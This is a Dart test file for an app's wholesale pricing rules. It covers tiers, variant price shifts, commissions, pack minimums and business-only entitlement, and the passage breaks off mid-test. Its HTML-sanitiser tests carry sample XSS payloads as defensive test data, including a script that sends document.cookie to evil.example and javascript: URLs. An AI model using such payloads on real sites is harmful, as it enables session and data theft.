import 'package:customer/constant/constant.dart';
import 'package:customer/models/admin_commission_model.dart';
import 'package:customer/models/cart_product_model.dart';
import 'package:customer/models/product_model.dart';
import 'package:customer/models/section_model.dart';
import 'package:customer/models/user_model.dart';
import 'package:customer/models/vendor_model.dart';
import 'package:customer/utils/wholesale_entitlement.dart';
import 'package:customer/utils/wholesale_pricing.dart';
import 'package:flutter_test/flutter_test.dart';

/// The signed-in customer, as the session holds them. WEB spec §19 reads
/// `accountType` + `businessProfile.status` off exactly this.
UserModel customer({String? accountType, String? status}) => UserModel(id: 'u1')
  ..accountType = accountType
  ..businessProfile = status == null ? null : <String, dynamic>{'status': status};

/// The only customer wholesale applies to: a business account the ADMIN
/// approved.
UserModel approvedBusinessCustomer() => customer(accountType: 'business', status: 'approved');

/// The resolution rule of WEB spec §10 / STORE spec §3, which this app has to
/// share with the website to the last unit:
///
///   unit(q) = the HIGHEST tier where q >= minQty AND tier.price < retail,
///             else retail
///
/// The client's own three tiers (15 / 3,500, 100 / 2,500, 500 / 2,000 against
/// a retail of 4,000) are the worked example of the spec, so they are the
/// worked example here.
void main() {
  // WEB spec §19: wholesale is for APPROVED business accounts only, so every
  // test of the ladder below is a test of what such a customer is charged. What
  // everybody ELSE gets has its own group at the bottom.
  setUp(() {
    WholesaleEntitlement.invalidate();
    Constant.userModel = approvedBusinessCustomer();
  });
  tearDown(() {
    Constant.userModel = null;
    WholesaleEntitlement.invalidate();
  });

  // The tiers as the panel may post them: out of order, and carrying the junk
  // rows `normaliseWholesaleTiers()` drops (no quantity, blank price).
  List<WholesaleTier> clientTiers() => WholesaleTier.parseList([
    {'minQty': '100', 'price': '2500'},
    {'minQty': '500', 'price': '2000'},
    {'minQty': '15', 'price': '3500'},
  ]);

  double unit(int qty, {double retail = 4000, List<WholesaleTier>? tiers}) => LinePrice.resolve(retail: retail, tiers: tiers ?? clientTiers(), quantity: qty).unit;

  group('tier resolution - the client\'s three tiers, posted out of order', () {
    test('the list is sorted on arrival, whatever order it arrived in', () {
      expect(clientTiers().map((t) => t.minQtyValue).toList(), [15, 100, 500]);
    });

    test('1-14 pay retail', () {
      expect(unit(1), 4000);
      expect(unit(14), 4000);
    });

    test('15-99 pay tier one', () {
      expect(unit(15), 3500);
      expect(unit(99), 3500);
    });

    test('100-499 pay tier two', () {
      expect(unit(100), 2500);
      expect(unit(499), 2500);
    });

    test('500+ pay tier three', () {
      expect(unit(500), 2000);
      expect(unit(5000), 2000);
    });

    test('every boundary, 14/15 - 99/100 - 499/500', () {
      expect([unit(14), unit(15)], [4000, 3500]);
      expect([unit(99), unit(100)], [3500, 2500]);
      expect([unit(499), unit(500)], [2500, 2000]);
    });

    test('the line carries the tier it is charged at', () {
      final LinePrice p = LinePrice.resolve(retail: 4000, tiers: clientTiers(), quantity: 120);
      expect(p.isWholesale, isTrue);
      expect(p.minQty, '100');
      expect(p.unit, 2500);
    });
  });

  group('downwards as well', () {
    test('a line taken to 500 and dropped to 5 is back at retail', () {
      expect(unit(500), 2000);
      expect(unit(5), 4000);
      expect(LinePrice.resolve(retail: 4000, tiers: clientTiers(), quantity: 5).isWholesale, isFalse);
    });

    test('and back up again, without having stuck anywhere', () {
      expect([unit(500), unit(5), unit(120), unit(14), unit(15)], [2000, 4000, 2500, 4000, 3500]);
    });
  });

  group('the cheaper-than-retail test is per tier, not a blanket skip', () {
    // A discount of 3,000 on the same product: tier one is not cheaper, so it
    // is skipped - while the deeper tiers still apply.
    test('20 units pay the discount, not tier one', () {
      expect(unit(20, retail: 3000), 3000);
      expect(LinePrice.resolve(retail: 3000, tiers: clientTiers(), quantity: 20).isWholesale, isFalse);
    });

    test('120 units still pay tier two and 600 still pay tier three', () {
      expect(unit(120, retail: 3000), 2500);
      expect(unit(600, retail: 3000), 2000);
    });

    test('a deeper tier that is dearer than retail never hides a cheaper one', () {
      // The failure of "take the highest tier reached, then clamp to retail":
      // at 120 units tier two is above retail, but tier one is below it.
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '15', 'price': '3500'},
        {'minQty': '100', 'price': '4500'},
      ]);
      expect(unit(120, tiers: tiers), 3500);
      expect(unit(20, tiers: tiers), 3500);
    });

    test('no tier cheaper than retail = retail', () {
      expect(unit(600, retail: 1500), 1500);
    });
  });

  group('rows the panel may post but nothing may price', () {
    test('a row with no quantity or a blank price is dropped', () {
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '', 'price': '2500'},
        {'minQty': '100', 'price': ''},
        {'price': '900'},
        {'minQty': '50'},
        {'minQty': '15', 'price': '3500'},
      ]);
      expect(tiers.where((t) => t.isUsable).map((t) => t.minQtyValue).toList(), [15]);
      expect(unit(200, tiers: tiers), 3500);
    });

    test('a quantity of one is not a wholesale tier', () {
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '1', 'price': '3500'},
      ]);
      expect(unit(50, tiers: tiers), 4000);
    });

    test('an empty list is retail at any quantity', () {
      expect(unit(10000, tiers: const <WholesaleTier>[]), 4000);
    });
  });

  group('the legacy pair', () {
    test('a product with no tier list is a product with one tier', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p1', 'price': '150', 'disPrice': '0', 'wholesaleEnabled': true, 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      expect(product.activeWholesaleTiers.length, 1);
      expect(product.activeWholesaleTiers.first.minQtyValue, 10);
      expect(LinePrice.resolve(retail: 150, tiers: product.activeWholesaleTiers, quantity: 9).unit, 150);
      expect(LinePrice.resolve(retail: 150, tiers: product.activeWholesaleTiers, quantity: 10).unit, 120);
    });

    test('the pair wins tier one when the two disagree', () {
      final ProductModel product = ProductModel.fromJson({
        'id': 'p2',
        'price': '4000',
        'wholesaleEnabled': true,
        'wholesalePrice': '3400',
        'wholesaleMinQty': '15',
        'wholesaleTiers': [
          {'minQty': '500', 'price': '2000'},
          {'minQty': '15', 'price': '3500'},
        ],
      });
      expect(product.activeWholesaleTiers.map((t) => '${t.minQty}/${t.price}').toList(), ['15/3400', '500/2000']);
    });

    test('wholesale off = no tiers at all', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p3', 'price': '150', 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      expect(product.activeWholesaleTiers, isEmpty);
    });
  });

  group('the next tier up', () {
    test('below the entry tier it is the entry tier', () {
      final WholesaleTier? next = LinePrice.nextTier(tiers: clientTiers(), quantity: 1, currentUnit: 4000);
      expect(next?.minQtyValue, 15);
    });

    test('on a tier it is the one above', () {
      final WholesaleTier? next = LinePrice.nextTier(tiers: clientTiers(), quantity: 15, currentUnit: 3500);
      expect(next?.minQtyValue, 100);
    });

    test('on the deepest tier there is nothing left to offer', () {
      expect(LinePrice.nextTier(tiers: clientTiers(), quantity: 500, currentUnit: 2000), isNull);
    });

    test('a tier that is not actually cheaper than what is paid now is suppressed', () {
      final List<WholesaleTier> tiers = WholesaleTier.parseList([
        {'minQty': '15', 'price': '3500'},
        {'minQty': '100', 'price': '3600'},
      ]);
      expect(LinePrice.nextTier(tiers: tiers, quantity: 20, currentUnit: 3500), isNull);
    });
  });

  group('the admin commission is on every tier', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: true, amount: '15', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    test('the Veggie Burger of the spec: 172.50 retail, 138.00 from ten', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p4', 'price': '150', 'disPrice': '0', 'wholesaleEnabled': true, 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      final double retail = WholesalePricing.retailPrice(product, vendor);
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor);
      expect(retail, closeTo(172.5, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 9).unit, closeTo(172.5, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 10).unit, closeTo(138, 0.001));
    });

    test('every tier of a ladder carries it, the deepest included', () {
      final ProductModel product = ProductModel.fromJson({
        'id': 'p5',
        'price': '4000',
        'wholesaleEnabled': true,
        'wholesaleTiers': [
          {'minQty': '500', 'price': '2000'},
          {'minQty': '15', 'price': '3500'},
          {'minQty': '100', 'price': '2500'},
        ],
      });
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor);
      expect(tiers.map((t) => t.priceValue).toList(), [4025, 2875, 2300]);
      final double retail = WholesalePricing.retailPrice(product, vendor);
      expect(retail, closeTo(4600, 0.001));
      // 15 / 4,025 is still under the commission-inclusive retail of 4,600.
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 20).unit, closeTo(4025, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: tiers, quantity: 500).unit, closeTo(2300, 0.001));
    });

    test('a wholesale price that is not cheaper is ignored - buying more never costs more', () {
      // disPrice 110 (126.50) against a wholesale price of 120 (138.00).
      final ProductModel product = ProductModel.fromJson({'id': 'p6', 'price': '150', 'disPrice': '110', 'wholesaleEnabled': true, 'wholesalePrice': '120', 'wholesaleMinQty': '10'});
      final double retail = WholesalePricing.retailPrice(product, vendor);
      expect(retail, closeTo(126.5, 0.001));
      expect(LinePrice.resolve(retail: retail, tiers: WholesalePricing.customerTiers(product, vendor), quantity: 10).unit, closeTo(126.5, 0.001));
    });
  });

  // ------------------------------------------------------------------------
  // WEB spec §10 / STORE spec §3, "A variant shifts the ladder, it does not
  // replace it" - 30 September. Read the old way ("this variant's only
  // wholesale price") it DESTROYED the ladder and overcharged: 50 of a tiered
  // kurti was charged 959 instead of 859.
  //
  //   product tiers      10 -> 949    50 -> 849    150 -> 749
  //
  //   variant blank   =>  949   849   749     the product's ladder, unchanged
  //   variant 949     =>  949   849   749     identical - the commonest case
  //   variant 999     =>  999   899   799     fifty more, throughout
  //   variant 899     =>  899   799   699     fifty less, throughout
  //
  // Steps are DIFFERENCES, not ratios. A tier that would fall to zero or below
  // is DROPPED, not clamped.
  // ------------------------------------------------------------------------
  group('a variant shifts the ladder, it does not replace it', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    /// The kurti of the live report: retail 1,509 a piece, tiers a hundred
    /// rupees apart.
    Map<String, dynamic> kurti(Map<String, dynamic> variant, {List<Map<String, String>>? tiers}) => {
      'id': 'p7',
      'price': '1509',
      'wholesaleEnabled': true,
      'wholesaleTiers':
          tiers ??
          [
            {'minQty': '10', 'price': '949'},
            {'minQty': '50', 'price': '849'},
            {'minQty': '150', 'price': '749'},
          ],
      'item_attribute': {
        'attributes': [],
        'variants': [
          {'variant_id': 'v-a', 'variant_price': '1509', 'variant_sku': 'A', ...variant},
        ],
      },
    };

    List<double> ladder(Map<String, dynamic> variant, {List<Map<String, String>>? tiers}) =>
        WholesalePricing.customerTiers(ProductModel.fromJson(kurti(variant, tiers: tiers)), vendor, variantId: 'v-a').map((t) => t.priceValue).toList();

    List<int> breaks(Map<String, dynamic> variant) =>
        WholesalePricing.customerTiers(ProductModel.fromJson(kurti(variant)), vendor, variantId: 'v-a').map((t) => t.minQtyValue).toList();

    test('blank is the normal case: the product\'s ladder, unchanged', () {
      expect(ladder({}), [949, 849, 749]);
      expect(breaks({}), [10, 50, 150]);
      // Byte-identical to the product's own tiers, not a re-rendered copy.
      final ProductModel product = ProductModel.fromJson(kurti({}));
      expect(
        WholesalePricing.customerTiers(product, vendor, variantId: 'v-a').map((t) => t.price).toList(),
        WholesalePricing.customerTiers(product, vendor).map((t) => t.price).toList(),
      );
    });

    test('an empty string is blank too', () {
      expect(ladder({'variant_wholesale_price': ''}), [949, 849, 749]);
      expect(ladder({'variant_wholesale_price': '   '}), [949, 849, 749]);
      expect(ladder({'variant_wholesale_price': '0'}), [949, 849, 749]);
    });

    test('the product\'s own tier-one price resolves to the identical ladder', () {
      // The figure the store panel used to REQUIRE on every variant. Nothing
      // had to be re-entered when the rule changed.
      expect(ladder({'variant_wholesale_price': '949'}), [949, 849, 749]);
      expect(breaks({'variant_wholesale_price': '949'}), [10, 50, 150]);
    });

    test('999 is fifty more throughout - differences, not ratios', () {
      expect(ladder({'variant_wholesale_price': '999'}), [999, 899, 799]);
      expect(breaks({'variant_wholesale_price': '999'}), [10, 50, 150]);
      // A ratio would have given 999 / 894.07 / 788.16.
    });

    test('899 is fifty less throughout', () {
      expect(ladder({'variant_wholesale_price': '899'}), [899, 799, 699]);
    });

    test('the quantity breaks stay the PRODUCT\'s, at every step of a shifted ladder', () {
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(ProductModel.fromJson(kurti({'variant_wholesale_price': '999'})), vendor, variantId: 'v-a');
      double unit(int q) => LinePrice.resolve(retail: 1509, tiers: tiers, quantity: q).unit;
      expect([unit(1), unit(9)], [1509, 1509]);
      expect([unit(10), unit(49)], [999, 999]);
      expect([unit(50), unit(149)], [899, 899]);
      expect([unit(150), unit(600)], [799, 799]);
    });

    test('the live overcharge: 50 of the tiered kurti is 859, not 959', () {
      // The bug, in the client's own numbers. Read as "this variant's only
      // price" the ladder collapsed to its entry price at every quantity.
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(ProductModel.fromJson(kurti({'variant_wholesale_price': '959'})), vendor, variantId: 'v-a');
      expect(tiers.map((t) => t.priceValue).toList(), [959, 859, 759]);
      expect(LinePrice.resolve(retail: 1509, tiers: tiers, quantity: 50).unit, 859);
      expect(LinePrice.resolve(retail: 1509, tiers: tiers, quantity: 50).unit * 50, 42950);
      // And the entry tier is still the entry tier.
      expect(LinePrice.resolve(retail: 1509, tiers: tiers, quantity: 10).unit, 959);
    });

    test('a tier that would fall to zero or below is DROPPED, not clamped', () {
      // 300 / 200 / 100 shifted down to 150 leaves 150 and 50; the third tier
      // would be -50, so it goes. Inventing a price would hide the mistake.
      final List<Map<String, String>> deep = [
        {'minQty': '10', 'price': '300'},
        {'minQty': '50', 'price': '200'},
        {'minQty': '150', 'price': '100'},
      ];
      expect(ladder({'variant_wholesale_price': '150'}, tiers: deep), [150, 50]);
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(ProductModel.fromJson(kurti({'variant_wholesale_price': '150'}, tiers: deep)), vendor, variantId: 'v-a');
      expect(tiers.map((t) => t.minQtyValue).toList(), [10, 50]);
      // 150 units pay the deepest tier that SURVIVED, never a clamped 0.
      expect(LinePrice.resolve(retail: 1509, tiers: tiers, quantity: 150).unit, 50);
    });

    test('a shift that wipes out every tier leaves no wholesale at all', () {
      final List<Map<String, String>> deep = [
        {'minQty': '10', 'price': '300'},
        {'minQty': '50', 'price': '200'},
      ];
      // 300 -> 100 is a shift of -200: tier one is 100, tier two would be 0.
      expect(ladder({'variant_wholesale_price': '100'}, tiers: deep), [100]);
      // Exactly zero is not a price either.
      expect(ladder({'variant_wholesale_price': '0.5'}, tiers: [
        {'minQty': '10', 'price': '200'},
        {'minQty': '50', 'price': '199.5'},
      ]), [0.5]);
    });

    // ---- the tri-state variant fields, unchanged: absent = the rule above ----

    test('a variant carrying none of the fields keeps the product ladder', () {
      expect(ladder({}), [949, 849, 749]);
      expect(breaks({}), [10, 50, 150]);
    });

    test('its own wholesaleMinQty moves TIER ONE\'s threshold only', () {
      expect(breaks({'wholesaleMinQty': '25'}), [25, 50, 150]);
      expect(ladder({'wholesaleMinQty': '25'}), [949, 849, 749]);
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(ProductModel.fromJson(kurti({'wholesaleMinQty': '25'})), vendor, variantId: 'v-a');
      expect(LinePrice.resolve(retail: 1509, tiers: tiers, quantity: 24).unit, 1509);
      expect(LinePrice.resolve(retail: 1509, tiers: tiers, quantity: 25).unit, 949);
      expect(LinePrice.resolve(retail: 1509, tiers: tiers, quantity: 150).unit, 749);
    });

    test('a threshold AND a shifted price: both apply, and the rest is the product\'s', () {
      expect(breaks({'variant_wholesale_price': '999', 'wholesaleMinQty': '25'}), [25, 50, 150]);
      expect(ladder({'variant_wholesale_price': '999', 'wholesaleMinQty': '25'}), [999, 899, 799]);
    });

    test('an EXPLICIT wholesaleEnabled: false makes that variant retail-only', () {
      final ProductModel product = ProductModel.fromJson(kurti({'wholesaleEnabled': false, 'variant_wholesale_price': '999'}));
      expect(WholesalePricing.customerTiers(product, vendor, variantId: 'v-a'), isEmpty);
      expect(WholesalePricing.isRetailOnlyVariant(product, 'v-a'), isTrue);
      // The product-level line is untouched.
      expect(WholesalePricing.customerTiers(product, vendor).length, 3);
    });

    test('an absent wholesaleEnabled is no opinion, not a false', () {
      expect(ladder({'wholesaleEnabled': ''}), [949, 849, 749]);
      expect(ladder({'wholesaleEnabled': true}), [949, 849, 749]);
      expect(ladder({'wholesaleEnabled': 'nonsense'}), [949, 849, 749]);
    });

    test('the commission goes on every SHIFTED tier, not only on tier one', () {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: true, amount: '10', commissionType: 'Percent'));
      final List<double> withCommission = ladder({'variant_wholesale_price': '999'});
      expect(withCommission.length, 3);
      expect(withCommission[0], closeTo(1098.9, 0.001));
      expect(withCommission[1], closeTo(988.9, 0.001));
      expect(withCommission[2], closeTo(878.9, 0.001));
    });
  });

  // ------------------------------------------------------------------------
  // WEB spec §10, the two other 30 September product-page rules.
  // ------------------------------------------------------------------------
  group('a wholesale-only product shows a price a customer can pay', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    Map<String, dynamic> kurti(String saleType, {Map<String, dynamic>? variant, String stock = '-1'}) => {
      'id': 'p10',
      'price': '1509',
      'quantity': -1,
      'wholesaleEnabled': true,
      'saleType': saleType,
      'wholesaleTiers': [
        {'minQty': '10', 'price': '949'},
        {'minQty': '50', 'price': '849'},
        {'minQty': '150', 'price': '749'},
      ],
      if (variant != null)
        'item_attribute': {
          'attributes': [],
          'variants': [
            {'variant_id': 'v-a', 'variant_price': '1509', 'variant_sku': 'A', 'variant_quantity': stock, ...variant},
          ],
        },
    };

    test('the headline is the ENTRY tier, not the retail price', () {
      final ProductModel product = ProductModel.fromJson(kurti('wholesale'));
      final WholesaleTier? headline = WholesalePricing.headlineTierFor(product, vendor);
      expect(headline, isNotNull);
      expect(headline!.priceValue, 949);
      expect(headline.minQtyValue, 10);
      expect(WholesalePricing.headlineMinimumLabel(headline.minQtyValue), contains('10'));
    });

    test('per selected variant: a size that costs fifty more says 999', () {
      final ProductModel product = ProductModel.fromJson(kurti('wholesale', variant: {'variant_wholesale_price': '999'}));
      expect(WholesalePricing.headlineTierFor(product, vendor, variantId: 'v-a')!.priceValue, 999);
    });

    test('retail and mixed products keep their retail headline - nothing here', () {
      expect(WholesalePricing.headlineTierFor(ProductModel.fromJson(kurti('both')), vendor), isNull);
      expect(WholesalePricing.headlineTierFor(ProductModel.fromJson(kurti('retail')), vendor), isNull);
      // The check is on the sale type alone, whatever the tiers say.
      expect(ProductModel.fromJson(kurti('both')).hasWholesaleTier, isTrue);
    });

    test('a retail-only VARIANT of a wholesale-only product keeps its retail headline', () {
      final ProductModel product = ProductModel.fromJson(kurti('wholesale', variant: {'wholesaleEnabled': false}));
      expect(WholesalePricing.headlineTierFor(product, vendor, variantId: 'v-a'), isNull);
    });
  });

  group('a size that cannot make up a pack says so', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    ProductModel sized(String stock, {String saleType = 'wholesale'}) => ProductModel.fromJson({
      'id': 'p11',
      'price': '1509',
      'quantity': -1,
      'wholesaleEnabled': true,
      'saleType': saleType,
      'wholesaleTiers': [
        {'minQty': '10', 'price': '949'},
        {'minQty': '50', 'price': '849'},
        {'minQty': '150', 'price': '749'},
      ],
      'item_attribute': {
        'attributes': [],
        'variants': [
          {'variant_id': 'v-a', 'variant_price': '1509', 'variant_sku': 'A', 'variant_quantity': stock},
        ],
      },
    });

    test('a size with fewer units than the smallest pack names the shortfall', () {
      final ProductModel product = sized('6');
      expect(WholesalePricing.stockFor(product, variantId: 'v-a'), 6);
      expect(WholesalePricing.minOrderQuantityFor(product, vendor, variantId: 'v-a'), 10);
      expect(WholesalePricing.packShortfall(product, vendor, variantId: 'v-a'), 4);
      expect(WholesalePricing.shortfallLabel(6, 10), contains('6'));
      expect(WholesalePricing.shortfallLabel(6, 10), contains('10'));
    });

    test('a size that can make up the pack is workable', () {
      expect(WholesalePricing.packShortfall(sized('10'), vendor, variantId: 'v-a'), 0);
      expect(WholesalePricing.packShortfall(sized('999'), vendor, variantId: 'v-a'), 0);
    });

    test('unlimited stock is never short', () {
      expect(WholesalePricing.packShortfall(sized('-1'), vendor, variantId: 'v-a'), 0);
    });

    test('a RETAIL or mixed product is never short of a pack', () {
      expect(WholesalePricing.packShortfall(sized('6', saleType: 'both'), vendor, variantId: 'v-a'), 0);
      expect(WholesalePricing.packShortfall(sized('6', saleType: 'retail'), vendor, variantId: 'v-a'), 0);
    });

    test('a tier the chosen size cannot reach is not advertised', () {
      // 60 left in a size, and "749 from 150 units, add 90 more" was an
      // invitation into a stock error.
      final ProductModel product = sized('60');
      final List<WholesaleTier> tiers = WholesalePricing.customerTiers(product, vendor, variantId: 'v-a');
      final WholesaleNote note = WholesalePricing.noteFor(retail: 1509, tiers: tiers, quantity: 50, stock: 60);
      expect(note.applied?.unit, 849);
      expect(note.next, isNull);
      // Without the stock the 150 tier would have been offered.
      expect(WholesalePricing.noteFor(retail: 1509, tiers: tiers, quantity: 50).next?.minQtyValue, 150);
    });

    test('and the price bands stop at the deepest tier the size can reach', () {
      final ProductModel product = sized('60');
      final List<PriceBand> shown = WholesalePricing.bands(
        retail: 1509,
        tiers: WholesalePricing.customerTiers(product, vendor, variantId: 'v-a'),
        wholesaleOnly: true,
        stock: 60,
      );
      expect(shown.map((b) => b.from).toList(), [10, 50]);
      expect(shown.last.to, isNull);
    });
  });

  group('saleType and the pack floor', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    Map<String, dynamic> ladder(String? saleType) => {
      'id': 'p8',
      'price': '4000',
      'wholesaleEnabled': true,
      if (saleType != null) 'saleType': saleType,
      'wholesaleTiers': [
        {'minQty': '15', 'price': '3500'},
        {'minQty': '100', 'price': '2500'},
        {'minQty': '500', 'price': '2000'},
      ],
    };

    test('absent, empty and unrecognised all read as "both"', () {
      for (final dynamic value in [null, '', '  ', 'nonsense', 'BOTH', 'retail']) {
        final ProductModel product = ProductModel.fromJson(ladder(value as String?));
        expect(product.effectiveSaleType, isNot(ProductModel.saleTypeWholesale), reason: 'saleType $value');
        expect(product.isWholesaleOnly, isFalse, reason: 'saleType $value');
        expect(WholesalePricing.minOrderQuantityFor(product, vendor), 1, reason: 'saleType $value');
      }
    });

    test('"wholesale" is not sold singly, and the floor is the ENTRY tier', () {
      final ProductModel product = ProductModel.fromJson(ladder('wholesale'));
      expect(product.isWholesaleOnly, isTrue);
      expect(WholesalePricing.minOrderQuantityFor(product, vendor), 15);
    });

    test('"Wholesale" in any case is still wholesale', () {
      final ProductModel product = ProductModel.fromJson(ladder('Wholesale'));
      expect(product.isWholesaleOnly, isTrue);
    });

    test('a wholesale-only product with no usable tier keeps a floor of one', () {
      final ProductModel product = ProductModel.fromJson({'id': 'p9', 'price': '4000', 'wholesaleEnabled': true, 'saleType': 'wholesale'});
      expect(product.isWholesaleOnly, isFalse);
      expect(WholesalePricing.minOrderQuantityFor(product, vendor), 1);
    });
  });

  group('wholesaleDetails is sanitised before it is rendered', () {
    test('script, iframe, object, embed, link, style and form tags go', () {
      const String raw = '''
        <p>Pack of 10</p>
        <script>fetch('https://evil.example/'+document.cookie)</script>
        <iframe src="https://evil.example"></iframe>
        <object data="x.swf"></object><embed src="x.swf">
        <link rel="stylesheet" href="https://evil.example/x.css">
        <style>body{display:none}</style>
        <form action="https://evil.example"><input name="card"></form>
      ''';
      final String safe = WholesalePricing.safeDetailsHtml(raw);
      for (final String tag in ['script', 'iframe', 'object', 'embed', 'link', 'style', 'form']) {
        expect(safe.toLowerCase(), isNot(contains('<$tag')));
      }
      expect(safe, contains('Pack of 10'));
      expect(safe.toLowerCase(), isNot(contains('evil.example/x.css')));
    });

    test('every on* handler goes, quoted or not', () {
      final String safe = WholesalePricing.safeDetailsHtml('<div onclick="steal()" ONMOUSEOVER=\'go()\' onload=go()>10 units</div>');
      expect(safe.toLowerCase(), isNot(contains('onclick')));
      expect(safe.toLowerCase(), isNot(contains('onmouseover')));
      expect(safe.toLowerCase(), isNot(contains('onload')));
      expect(safe, contains('10 units'));
    });

    test('javascript: URLs go, however they are spelled', () {
      final String safe = WholesalePricing.safeDetailsHtml('<a href="javascript:alert(1)">terms</a><img src=javascript:alert(2)>');
      expect(safe.toLowerCase(), isNot(contains('javascript:')));
      expect(safe, contains('terms'));
    });

    test('an inline image survives, a data: document does not', () {
      final String safe = WholesalePricing.safeDetailsHtml('<img src="data:image/png;base64,AAA"><a href="data:text/html,<script>x()</script>">terms</a>');
      expect(safe, contains('data:image/png'));
      expect(safe.toLowerCase(), isNot(contains('data:text/html')));
    });

    test('a price table - the point of the field - survives', () {
      const String table = '<table><tr><th>Qty</th><th>Price</th></tr><tr><td>15+</td><td>3 500</td></tr></table>';
      expect(WholesalePricing.safeDetailsHtml(table), table);
    });

    test('null, empty and blank are nothing at all', () {
      expect(WholesalePricing.safeDetailsHtml(null), '');
      expect(WholesalePricing.safeDetailsHtml(''), '');
      expect(WholesalePricing.safeDetailsHtml('   \n '), '');
    });
  });

  group('the order line a panel reads back', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    CartProductModel line(int quantity) => CartProductModel(
      id: 'p1',
      price: '4000',
      discountPrice: '0',
      quantity: quantity,
      lineMeta: CartLineMeta(tiers: clientTiers(), saleType: ProductModel.saleTypeBoth, minOrderQty: 1, fulfilment: const ['delivery', 'takeaway']),
    );

    test('the whole line is repriced, never only the units past the threshold', () {
      expect(line(500).chargedUnitPrice * 500, 1000000);
      expect(line(120).chargedUnitPrice * 120, 300000);
    });

    test('the written line carries the charged price and the tier applied', () {
      final CartProductModel order = line(120).toOrderLine();
      expect(order.price, '2500');
      expect(order.isWholesale, isTrue);
      expect(order.wholesaleMinQty, '100');
      expect(order.unitPrice, 2500);
    });

    test('a retail line is written exactly as before', () {
      final CartProductModel order = line(5).toOrderLine();
      expect(order.price, '4000');
      expect(order.isWholesale, isFalse);
      expect(order.wholesaleMinQty, '');
      expect(order.unitPrice, 4000);
    });
  });

  // ------------------------------------------------------------------------
  // WEB spec §19 - "Wholesale for approved business accounts only", the
  // client's decision of 30 September. A blanket rule, not a per-product one:
  //
  //   wholesale-only  ->  hidden from every listing, refused on a direct link
  //   mixed           ->  the product, at RETAIL: no badge, no ladder, no tier
  //                       price however many they buy, no pack minimum
  //   retail          ->  unchanged
  //
  // "Approved" is accountType == "business" AND businessProfile.status ==
  // "approved" - the ADMIN's decision. It fails CLOSED.
  // ------------------------------------------------------------------------
  group('wholesale is for approved business accounts only', () {
    setUp(() {
      Constant.sectionConstantModel = SectionModel(adminCommision: AdminCommission(isEnabled: false, amount: '0', commissionType: 'Percent'));
    });
    tearDown(() => Constant.sectionConstantModel = null);

    final VendorModel vendor = VendorModel(id: 'v1');

    Map<String, dynamic> tiered(String saleType, {bool? businessOnly}) => {
      'id': 'p12',
      'price': '1509',
      'wholesaleEnabled': true,
      'saleType': saleType,
      'wholesaleBusinessOnly': ?businessOnly,
      'wholesaleTiers': [
        {'minQty': '10', 'price': '949'},
        {'minQty': '50', 'price': '849'},
        {'minQty': '150', 'price': '749'},
      ],
    };

    ProductModel mixed({bool? businessOnly}) => ProductModel.fromJson(tiered('both', businessOnly: businessOnly));
    ProductModel wholesaleOnly({bool? businessOnly}) => ProductModel.fromJson(tiered('wholesale', businessOnly: businessOnly));
    ProductModel retailOnly() => ProductModel.fromJson({'id': 'p13', 'price': '1509'});

    test('an APPROVED business account gets the whole ladder', () {
      Constant.userModel = approvedBusinessCustomer();
      expect(WholesaleEntitlement.mayBuyWholesale, isTrue);
      expect(WholesalePricing.customerTiers(mixed(), vendor).length, 3);
      expect(mixed().hiddenForCustomer, isFalse);
      expect(wholesaleOnly().hiddenForCustomer, isFalse);
      expect(WholesalePricing.minOrderQuantityFor(wholesaleOnly(), vendor), 10);
    });

    test('a personal account gets no tier, no badge and no pack minimum', () {
      Constant.userModel = customer();
      expect(WholesaleEntitlement.mayBuyWholesale, isFalse);
      final ProductModel product = mixed();
      expect(product.activeWholesaleTiers, isEmpty);
      expect(product.hasWholesaleTier, isFalse);
      expect(WholesalePricing.customerTiers(product, vendor), isEmpty);
      expect(WholesalePricing.listingBadgeLabel(product, vendor), '');
      expect(WholesalePricing.minOrderQuantityFor(product, vendor), 1);
      expect(product.minOrderQuantity, 1);
      expect(product.effectiveSaleType, ProductModel.saleTypeRetail);
    });

    test('and no tier price however many they buy', () {
      Constant.userModel = customer();
      final ProductModel product = mixed();
